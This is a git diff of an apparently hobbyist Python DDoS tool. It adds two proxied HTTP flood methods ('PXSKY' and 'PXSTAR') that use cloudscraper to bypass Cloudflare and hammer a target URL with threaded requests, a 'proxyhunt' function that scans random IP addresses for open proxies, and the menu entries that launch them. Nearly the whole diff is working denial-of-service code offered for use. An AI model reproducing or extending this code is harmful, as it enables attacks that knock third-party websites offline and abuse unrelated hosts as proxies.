@@ -59,7 +59,10 @@ class logo():
         clear()
         logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"SKY "+'\033[1;35m'+"         | "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSKY "+'\033[1;35m'+"       | "+'\033[0m'+"Flood Sky Method"+'\033[1;35m'+"║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"With Proxy      "+'\033[1;35m'+"║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"CFB "+'\033[1;35m'+"         | "+'\033[0m'+"CF Bypass      "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXSTAR "+'\033[1;35m'+"      | "+'\033[0m'+"PXStar Flood   "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"ION "+'\033[1;35m'+"         | "+'\033[0m'+"Lazer FLOOD    "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFB "+'\033[1;35m'+"       | "+'\033[0m'+"Proxy CF Flood "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"PXCFPRO "+'\033[1;35m'+"     | "+'\033[0m'+"Proxy CFPRO    "+'\033[1;35m'+" ║ \n"
@@ -85,6 +88,8 @@ class logo():
         logo = f""+'\033[0m'+"\t\t╔══════"+'\033[1;35m'+"════════════════════════════╗ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"crawl "+'\033[1;35m'+"       | "+'\033[0m'+"Web Crawler    "+'\033[1;35m'+" ║ \n"
         logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"ping "+'\033[1;35m'+"        | "+'\033[0m'+"Ping Site      "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║ "+'\033[0;31;40m'+"•"+'\033[1;35m'+" "+'\033[0m'+"proxyhunt "+'\033[1;35m'+"   | "+'\033[0m'+"Hunt random    "+'\033[1;35m'+" ║ \n"
+        logo += "\t\t║                | "+'\033[0m'+"proxy           "+'\033[1;35m'+"║ \n"
         logo += "\t\t╚══════════════════════════"+'\033[0m'+"════════╝ \n"
         print(logo)
 class DDOS():
@@ -578,6 +583,68 @@ class DDOS():
             threadsi = input("Threads : ")
             t = input("Time : ")
             start_pwn(url, threadsi, t)
+    def PXSKY():
+        def start_pxsky(url, threadsi, t):
+            scraper = cloudscraper.create_scraper()
+            ip = open('ip_list.txt', 'r')
+            proxies = ip.readlines()
+            ip.close()
+            def requestor(url, proxy, scraper):
+                requests.get(url, proxies=proxy)
+                scraper.get(url, proxies=proxy)
+                requests.get(url, proxies=proxy)
+                scraper.get(url, proxies=proxy)
+            while countdown(t):
+                ts = threading.Thread(target=attack_pxsky, args=(url, scraper, threadsi, proxies, requestor))
+                ts.start()
+        def attack_pxsky(url, scraper, threadsi, proxies, requestor):
+            proxy = {
+                "http": 'http://'+random.choice(proxies),
+                "https": 'https://'+random.choice(proxies)
+            }
+            if int(threadsi) > 0:
+                try:
+                    requestor(url, proxy, scraper)
+                except:
+                    pass
+        if __name__ == '__main__':
+            url = input("Target Url : ")
+            threadsi = input("Threads : ")
+            t = input("Time : ")
+            start_pxsky(url, threadsi, t)
+    def PXSTAR():
+        ua = UserAgent()
+        ip = open('ip_list.txt','r')
+        proxies = ip.readlines()
+        ip.close()
+        header = {
+            "User-Agent": ua.chrome,
+            "Accept": "text/plain,text/html,*/*",
+            "Accept-Encoding": "gzip,deflate,br",
+            "Connection": "keep-alive"
+        }
+        proxy = {
+            "http": 'http://'+str(random.choice(proxies)),
+            "https": 'https://'+str(random.choice(proxies))
+        }
+        def star(url, header, proxy):
+            scraper = cloudscraper.create_scraper(disableCloudflareV1=True)
+            try:
+                scraper.get(url, headers=header, proxies=proxy)
+                requests.get(url, headers=header, proxies=proxy)
+                for _ in range(200):
+                    scraper.get(url, headers=header, proxies=proxy)
+            except Exception as e:
+                print("An error occurred, Please contact @MrSanZzXe at telegram, Error Code : ", e)
+                exit()
+        def attack(t, url):
+            while countdown(t):
+                ts = threading.Thread(target=star, args=(url, header, proxy))
+                ts.start()
+        if __name__ == '__main__':
+            url = input("Target Url : ")
+            t = input("Time : ")
+            attack(t, url)
     ################LAYER 4################
     ###UDP TCP TLS SYN ACK ICMP ESP SSH ###
     
@@ -651,12 +718,19 @@ class TOOLS():
     def webcrawler():
         def web_crawler(url):
             ua = UserAgent()
+            ip = open('ip_list.txt', 'r')
+            proxies = ip.readlines()
+            ip.close()
+            proxy = {
+                "http": 'http://'+str(random.choice(proxies)),
+                "https": 'https://'+str(random.choice(proxies))
+            }
             heads = {
                 f"User-Agent": f"{ua.chrome}"
             }
             try:
                 # Send a GET request to the URL
-                response = requests.get(url, headers=heads)
+                response = requests.get(url, headers=heads, proxies=proxy)
 
                 # Check if the request was successful (status code 200)
                 if response.status_code == 200:
@@ -693,13 +767,18 @@ class TOOLS():
             web_crawler(site)
     def ping():
         def ping_website(website):
-            response = os.system("ping -t " + website)
+            try:
+                if os.name == 'nt':
+                    response = os.system("ping -t " + website)
+                elif os.name == 'posix':
+                    response = os.system("ping " + website)
 
-            if response == 0:
-                print(f"{website} is up!")
-            else:
-                print(f"{website} is down.")
-
+                if response == 0:
+                    print(f"{website} is up!")
+                else:
+                    print(f"{website} is down.")
+            except KeyboardInterrupt:
+                return
         url = input("Target Url : ")
         if 'https://' in url:
             website = url.replace('https://', '\r')
@@ -708,6 +787,48 @@ class TOOLS():
         else:
             pass
         ping_website(website)
+    def proxyhunt():
+        def start_hunt():
+            def random_ip():
+                ips = random.randint(1,3)
+                ip1 = ''.join(random.choices("0123456789", k=ips))
+                ip2 = ''.join(random.choices("0123456789", k=ips))
+                ip3 = ''.join(random.choices("0123456789", k=ips))
+                ip4 = ''.join(random.choices("0123456789", k=ips))
+                ip = "{}.{}.{}.{}:{}".format(ip1,ip2,ip3,ip4,port)
+                return ip
+            while True:
+                time.sleep(0.1)
+                count = int(0)
+                jum = random.randint(1, 5)
+                port = ''.join(random.choices("0123456789", k=jum))
+                ip_list = random_ip()
+                print(ip_list)
+                try:
+                    prox = 'http://'+ip_list
+                    r = requests.get(prox)
+                    if r.status_code == 200:
+                        print("Proxy Detected !")
+                        count += 1
+                        def write_proxy():
+                            ip = open('proxy_list.txt', 'r')
+                            ip.write(str(ip_list+'\n'))
+                            ip.close()
+                            print("{} Proxy Hunted. : {}".format(count, ip_list))
+                        write_proxy()
+                        pass
+                    else:
+                        print("Not a proxy : {}".format(ip_list))
+                        pass
+                except KeyboardInterrupt:
+                    exit()
+                except:
+                    pass
+        if __name__ == '__main__':
+            print("Start Hunting..")
+            while True:
+                tr = threading.Thread(target=start_hunt)
+                tr.start()
 class main():
     def main():
         logo.main()
@@ -757,10 +878,16 @@ class main():
                     DDOS.TCP()
                 elif prompt.lower() == 'pwn':
                     DDOS.PWNED()
+                elif prompt.lower() == 'pxsky':
+                    DDOS.PXSKY()
+                elif prompt.lower() == 'pxstar':
+                    DDOS.PXSTAR()
                 elif prompt.lower() == 'crawl':
                     TOOLS.webcrawler()
                 elif prompt.lower() == 'ping':
                     TOOLS.ping()
+                elif prompt.lower() == 'proxyhunt':
+                    TOOLS.proxyhunt()
                 elif prompt.lower() == 'exit':
                     print("Cya! ;).")
                     exit()
